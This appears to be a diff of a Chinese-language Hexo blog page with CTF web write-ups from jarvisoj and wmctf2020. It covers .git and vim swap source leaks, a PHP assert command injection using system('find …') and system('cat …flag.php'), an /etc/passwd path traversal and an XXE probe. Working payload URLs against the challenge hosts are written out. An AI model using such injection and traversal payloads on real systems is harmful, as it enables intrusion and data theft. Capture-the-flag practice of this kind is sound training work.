@@ -14,19 +14,21 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="jarvisoj babyphp1. .git源码泄露2. php基础理解.git源码泄露：  .git文件夹是在clone或者init一个项目后生成的，其含有HEAD、config、description、hooks&#x2F;、info&#x2F;、objects&#x2F;、refs&#x2F;等，几乎包含了让git可以正常使用的所有信息。可以利用.git文件来恢复某项目的源代码，因此在项目部署后忘记删除.git文件，会造成由于.">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2%5Cweb1.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2%5Cweb2.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2%5Cweb3.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2%5Cweb4.jpg">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/%E5%8D%9A%E5%AE%A2/source/_posts/ctf-web2/web5.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2%5Cweb6.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2%5Cweb7.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2%5Cweb8.png">
+<meta property="og:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/web1.png">
+<meta property="og:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/web2.png">
+<meta property="og:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/web3.png">
+<meta property="og:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/web4.jpg">
+<meta property="og:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/web5.png">
+<meta property="og:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/web6.png">
+<meta property="og:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/web7.png">
+<meta property="og:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/web8.png">
+<meta property="og:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/web9.png">
+<meta property="og:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/web10.png">
 <meta property="article:published_time" content="2020-08-01T13:27:30.000Z">
-<meta property="article:modified_time" content="2020-08-02T03:10:40.818Z">
+<meta property="article:modified_time" content="2020-08-02T08:28:42.295Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2%5Cweb1.png">
+<meta name="twitter:image" content="http://zmh2000829.github.io/2020/08/01/ctf-web2/web1.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -99,31 +101,41 @@
       
         <h4 id="jarvisoj-babyphp"><a href="#jarvisoj-babyphp" class="headerlink" title="jarvisoj babyphp"></a><u>jarvisoj babyphp</u></h4><h6 id="1-git源码泄露"><a href="#1-git源码泄露" class="headerlink" title="1. .git源码泄露"></a>1. .git源码泄露</h6><h6 id="2-php基础"><a href="#2-php基础" class="headerlink" title="2. php基础"></a>2. php基础</h6><p><strong><em>理解.git源码泄露</em></strong>：</p>
 <p> <em>.git文件夹是在clone或者init一个项目后生成的，其含有HEAD、config、description、hooks/、info/、objects/、refs/等，几乎包含了让git可以正常使用的所有信息。可以利用.git文件来恢复某项目的源代码，因此在项目部署后忘记删除.git文件，会造成由于.git文件导致的源码泄露的情况。</em></p>
-<p><img src="/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2%5Cweb1.png" alt="web1"></p>
+<p><img src="/2020/08/01/ctf-web2/web1.png" alt="web1"></p>
 <p>根据提示可以推测有.git源码泄露（<em>同样我们可以直接在网站后加.git/config直接检测是否有.git源码泄露）</em>，使用工具GitHack 在index.php中发现源代码。</p>
-<p><img src="/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2%5Cweb2.png" alt="web2"></p>
+<p><img src="/2020/08/01/ctf-web2/web2.png" alt="web2"></p>
 <p>if (isset($_GET[‘page’])) {<br>    $page = $_GET[‘page’];<br>} else {<br>    $page = “home”;<br>}<br>$file = “templates/“ . $page . “.php”;<br>assert(“strpos(‘$file’, ‘..’) === false”) or die(“Detected hacking attempt!”);<br>assert(“file_exists(‘$file’)”) or die(“That file doesn’t exist!”);<br>?&gt;</p>
 <p>简单的php，直接用hackbar，get型注入构造XXXX/?page=XXXX，利用上篇文章的模板，直接先爆出含有flag名的文件<em><a href="http://web.jarvisoj.com:32798/?page=&#39;.system" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/?page=&#39;.system</a>(“find / -name ‘flag</em>‘“)</p>
-<p><img src="/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2%5Cweb3.png" alt="web3"></p>
+<p><img src="/2020/08/01/ctf-web2/web3.png" alt="web3"></p>
 <p>发现/opt/lampp/htdocs/templates/flag.php，正好是我们在GitHack得到的flag.php，继续构造<em><a href="http://web.jarvisoj.com:32798/?page=&#39;.system" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/?page=&#39;.system</a>(“cat /opt/lampp/htdocs/templates/flag.php”).’</em></p>
-<p><img src="/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2%5Cweb4.jpg" alt="web4"></p>
+<p><img src="/2020/08/01/ctf-web2/web4.jpg" alt="web4"></p>
 <p>直接右键看网页源代码找到了被注释的flag -&gt; 61dctf{8e_careful_when_us1ng_ass4rt}</p>
 <h4 id="jarvisoj-flag在管理员手里"><a href="#jarvisoj-flag在管理员手里" class="headerlink" title="jarvisoj flag在管理员手里"></a><u>jarvisoj flag在管理员手里</u></h4><h6 id="1-vim源码泄露"><a href="#1-vim源码泄露" class="headerlink" title="1. vim源码泄露"></a>1. vim源码泄露</h6><h6 id="2-php（序列化与hash长度扩展攻击）"><a href="#2-php（序列化与hash长度扩展攻击）" class="headerlink" title="2. php（序列化与hash长度扩展攻击）"></a>2. php（序列化与hash长度扩展攻击）</h6><p>用御剑直接扫可以看到有swp文件泄露，xxx/index.php~,得到index.php_文件后。将该文件重命名为.index.php.swp，在该目录下vim -r index.php来恢复“临时文件”。（同样可以在win中用Gvim恢复文件）得到源码。</p>
-<img src="/2020/08/01/ctf-web2/博客\source\_posts\ctf-web2\web5.png" style="zoom:80%;">
-
+<p><img src="/2020/08/01/ctf-web2/web5.png" alt="web5"></p>
 <p>然后F12打开application的cookies，发现变量role与hsh，显然role是url加密的解密后得到s:5:”guest”;应该是序列化后的结果，于是直接抓包将role变量改为 s:5:”admin”;url加密后的值 但是没有什么用，于是关注hsh变量。</p>
 <p>理解hash长度扩展攻击：参考文档<a href="https://www.freebuf.com/articles/database/164019.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/database/164019.html</a></p>
-<h4 id="wmctf2020-web-checkin"><a href="#wmctf2020-web-checkin" class="headerlink" title="wmctf2020 web-checkin"></a><u>wmctf2020 web-checkin</u></h4><p><img src="/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2%5Cweb6.png" alt="web6"></p>
+<p>/<em>到这里就卡住了</em>/ 努力解题中</p>
+<h4 id="wmctf2020-web-checkin"><a href="#wmctf2020-web-checkin" class="headerlink" title="wmctf2020 web-checkin"></a><u>wmctf2020 web-checkin</u></h4><p><img src="/2020/08/01/ctf-web2/web6.png" alt="web6"></p>
 <p>还是要构造payload，?/content=xxxx，首先正则判断如果payload包含上述就会die，当payload是某个存在的file就会有输出。</p>
 <p>用常用“模板” -&gt; <a href="http://web_checkin.wmctf.wetolink.com/?content=../../../../../../../../../../etc/passwd发现有输出。" target="_blank" rel="noopener">http://web_checkin.wmctf.wetolink.com/?content=../../../../../../../../../../etc/passwd发现有输出。</a></p>
-<p><img src="/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2%5Cweb7.png" alt="web7"></p>
+<p><img src="/2020/08/01/ctf-web2/web7.png" alt="web7"></p>
 <p>于是直接将其改为flag-&gt; <u>content=../../../../../../../../../../flag</u>得到flag</p>
-<p><img src="/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2%5Cweb8.png" alt="web8"></p>
+<p><img src="/2020/08/01/ctf-web2/web8.png" alt="web8"></p>
+<h4 id="jarvisoj-api调用"><a href="#jarvisoj-api调用" class="headerlink" title="jarvisoj api调用"></a><u>jarvisoj api调用</u></h4><p>开始没想到要用xxe，看一下题解之后才发现</p>
+<p>burp截包，首先判断是否存在xxe漏洞，使用模板</p>
+<p> &lt;?xml version=”1.0”?  &gt;</p>
+<p>&lt;! DOCTYPE test[</p>
+<p>&lt;! ENTITY t “here is a xxe”  &gt;] &gt;</p>
+<p>&lt; h&gt;&t;&lt; /h&gt; </p>
+<p>对于这个包先将content-type添加xml形式运行</p>
+<p><img src="/2020/08/01/ctf-web2/web9.png" alt="web9"></p>
+<p>发现存在xxe漏洞，修改报文，得到flag</p>
+<p><img src="/2020/08/01/ctf-web2/web10.png" alt="web10"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://zmh2000829.github.io/2020/08/01/ctf-web2/" data-id="ckdcjl3so0002o0vb608x4aj0" class="article-share-link">Share</a>
+      <a data-url="http://zmh2000829.github.io/2020/08/01/ctf-web2/" data-id="ckdctq2qk00040wvbac2j9dhp" class="article-share-link">Share</a>
       
       
     </footer>
